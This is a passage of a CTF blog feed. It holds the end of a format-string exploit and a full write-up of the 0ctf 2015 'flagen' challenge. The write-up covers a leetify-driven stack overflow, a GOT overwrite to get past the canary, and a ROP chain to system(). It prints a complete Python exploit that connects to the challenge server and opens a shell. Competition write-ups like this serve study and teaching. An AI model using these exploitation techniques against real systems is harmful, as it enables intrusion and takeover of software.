</span><span class='line'>  <span class="c"># instrumental in finding the right offset!</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of base: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked address of stack: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Login: &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we need to return to base_addr + 0xfb3, because that function </span>
</span><span class='line'>  <span class="c"># is designed to read the flag &amp; spit it over the socket</span>
</span><span class='line'>  <span class="n">print_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xfb3</span> <span class="o">-</span> <span class="mi">2</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Offset format string with {} bytes&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">print_offset</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send format string to overwrite saved return addr of </span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="si">%05d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">print_offset</span> <span class="o">+</span><span class="s">&#39;c___%10$hn&#39;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">-</span><span class="mi">504</span><span class="p">))</span>   <span class="c"># should point to ret_addr at stack</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;bleh&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - Flagen]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/"/>
    <updated>2015-03-30T19:32:07+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-flagen</id>
    <content type="html"><![CDATA[<p>0ctf sported a number of challenges and I was happy to grab a few flags. Here&rsquo;s how we solved <code>flagen</code>.</p>

<!-- more -->


<p><code>flagen</code> is a 32-bit ELF, and we&rsquo;re also given the corresponding <code>libc</code> library. It functions as a flag generator, which can perform various functions on the input:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>== 0ops Flag Generator ==
</span><span class='line'>1. Input Flag
</span><span class='line'>2. Uppercase
</span><span class='line'>3. Lowercase
</span><span class='line'>4. Leetify
</span><span class='line'>5. Add Prefix
</span><span class='line'>6. Output Flag
</span><span class='line'>7. Exit 
</span><span class='line'>=========================</span></code></pre></td></tr></table></div></figure>


<p>We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is <code>leetify</code>, because this takes the input and transforms it to leet-speak:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>== 0ops Flag Generator ==
</span><span class='line'>1. Input Flag
</span><span class='line'>2. Uppercase
</span><span class='line'>3. Lowercase
</span><span class='line'>4. Leetify
</span><span class='line'>5. Add Prefix
</span><span class='line'>6. Output Flag
</span><span class='line'>7. Exit 
</span><span class='line'>=========================
</span><span class='line'>Your choice: 1
</span><span class='line'>Hello World!
</span><span class='line'>Done.
</span><span class='line'>== 0ops Flag Generator ==
</span><span class='line'>1. Input Flag
</span><span class='line'>2. Uppercase
</span><span class='line'>3. Lowercase
</span><span class='line'>4. Leetify
</span><span class='line'>5. Add Prefix
</span><span class='line'>6. Output Flag
</span><span class='line'>7. Exit 
</span><span class='line'>=========================
</span><span class='line'>Your choice: 4
</span><span class='line'>Done.
</span><span class='line'>== 0ops Flag Generator ==
</span><span class='line'>1. Input Flag
</span><span class='line'>2. Uppercase
</span><span class='line'>3. Lowercase
</span><span class='line'>4. Leetify
</span><span class='line'>5. Add Prefix
</span><span class='line'>6. Output Flag
</span><span class='line'>7. Exit 
</span><span class='line'>=========================
</span><span class='line'>Your choice: 6
</span><span class='line'>The Flag is: 1-13110 W0r1d!
</span><span class='line'>Done.</span></code></pre></td></tr></table></div></figure>


<p>There are several transformations done, but most importantly, the <code>H</code> is translated into <code>1-1</code>. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times <code>H</code> and then asking it to perform <code>leetify</code>, the program generates a segmentation fault.</p>

<h2>Narrowing down</h2>

<p>After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of <code>H</code> bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it&rsquo;s time to get creative.</p>

<p>The epilogue of the vulnerable function looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
</span><span class='line'>8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
</span><span class='line'>8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
</span><span class='line'>8048ae1: mov    DWORD PTR [esp],eax
</span><span class='line'>8048ae4: call   80484f0 &lt;strcpy@plt&gt;
</span><span class='line'>8048ae9: mov    eax,DWORD PTR [ebp-0xc]
</span><span class='line'>8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
</span><span class='line'>8048af3: je     8048afa &lt;atoi@plt+0x59a&gt;
</span><span class='line'>8048af5: call   80484e0 &lt;__stack_chk_fail@plt&gt; ; terminate if canary is overwritten
</span><span class='line'>8048afa: add    esp,0x124
</span><span class='line'>8048b00: pop    edi
</span><span class='line'>8048b01: pop    ebp
</span><span class='line'>8048b02: ret    </span></code></pre></td></tr></table></div></figure>


<p>Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will <em>always</em> call <code>stack_chk_fail</code> and terminate. Luckily, <code>stack_chk_fail</code> is an imported function, which means we can overwrite its GOT entry with the hijacked <code>strcpy</code>! This will lead to control over <code>eip</code>. Just one final hurdle&hellip;</p>

<h2>ROP it likes it&rsquo;s hot</h2>

<p>NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice <code>add esp, 0x1c; pop pop pop pop ret</code> gadget and decided to overwrite <code>stack_chk_fail</code> with that address. This will pivot <code>esp</code> into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of <code>read</code> to make it point to <code>system</code>. Then, write out the string <code>sh;</code> in memory and using that as an argument for <code>system</code>.</p>

<p>To make this happen, I just two more gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret</span>
</span><span class='line'><span class="c"># 0x08048aff : add [edi + 0x5d], bl; ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the first gadget, I could control the values of various registers, provided there are no bad chars. <code>0x00</code> is obviously bad, but remember, we pass the buffer to <code>leetify</code>: it will mangle chars like <code>H</code> and <code>s</code>! These must also be avoided, which is why the ROP chain builds the characters <code>s</code> and <code>h</code> in two parts in memory.</p>

<p>The second gadget allows me to adjust values. Because <code>libc</code> is given, the output of <code>nm -D ./libc.so.6</code> could be grepped for <code>system</code> and <code>read</code>. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out <code>sh;</code> into an empty piece of GOT memory. Finally, ret2system via <code>read@plt</code> and pop a shell!</p>

<p>The final exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;202.112.28.115&#39;</span><span class="p">,</span> <span class="mi">5149</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>     <span class="c"># input flag</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># gadgets </span>
</span><span class='line'>  <span class="c"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret</span>
</span><span class='line'>  <span class="c"># 0x08048aff : add [edi + 0x5d], bl; ret</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># start building the ropchain</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="c"># 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048d89</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;0000&#39;</span><span class="o">*</span><span class="mi">2</span> <span class="c"># junk</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># from libc.6.so:</span>
</span><span class='line'>  <span class="c"># 00040190 W system</span>
</span><span class='line'>  <span class="c"># 000dabd0 W read</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c">### first byte</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffffc0</span><span class="p">)</span> <span class="c"># ebx, lower byte is important read -&gt; system (0xd0 + 0xc0 = 0x190)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b00c</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>      <span class="c"># edi -&gt; read@got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="c">### second byte</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffff56</span><span class="p">)</span> <span class="c"># ebx, lower byte is important read -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b00d</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>      <span class="c"># edi -&gt; read@got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="c">### third byte</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xfffffff7</span><span class="p">)</span> <span class="c"># ebx, lower byte is important sprintf -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b00e</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>      <span class="c"># edi -&gt; read@got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c">### write &#39;sh;&#39; in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffff39</span><span class="p">)</span> <span class="c"># ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804b1ff</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>     <span class="c"># edi -&gt; buf in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffff3a</span><span class="p">)</span> <span class="c"># ebx, 3a </span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804b1ff</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>     <span class="c"># edi -&gt; buf in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="c">### write &#39;sh;&#39; in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffff34</span><span class="p">)</span> <span class="c"># ebx, 68 == h</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804b200</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>     <span class="c"># edi -&gt; buf in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == &#39;h&#39;</span>
</span><span class='line'>  <span class="c">### write &#39;sh;&#39; in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048d8c</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xffffff3b</span><span class="p">)</span> <span class="c"># ebx, 3b == ;</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># esi</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804b201</span><span class="o">-</span><span class="mh">0x5d</span><span class="p">)</span>     <span class="c"># edi -&gt; buf in got</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>          <span class="c"># ebp</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08048aff</span><span class="p">)</span> <span class="c"># 0x08048aff</span>
</span><span class='line'>  <span class="c">###</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span>      <span class="c"># read@plt -&gt; points to system()</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;1111&#39;</span>           <span class="c"># fake ret addr</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804b1ff</span><span class="p">)</span> <span class="c"># pointer to &#39;sh;&#39;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">ropchain_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>  <span class="n">adjust_with_H</span> <span class="o">=</span> <span class="p">((</span><span class="mi">276</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">/</span><span class="mi">3</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;H&#39;</span> <span class="o">*</span> <span class="n">adjust_with_H</span>   <span class="c"># add the correct amount of H&#39;s needed for the overflow; the pointer for strcpy() is at esp+276</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">276</span><span class="o">-</span><span class="n">ropchain_length</span><span class="o">-</span><span class="n">adjust_with_H</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="c"># how many A bytes do we need to make up the buffer to exactly 276 bytes?</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b01c</span><span class="p">)</span>  <span class="c"># point the strcpy to this address: stack_chk_fail@got &gt;;]</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>     <span class="c"># leetify</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] enjoy your shell!&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
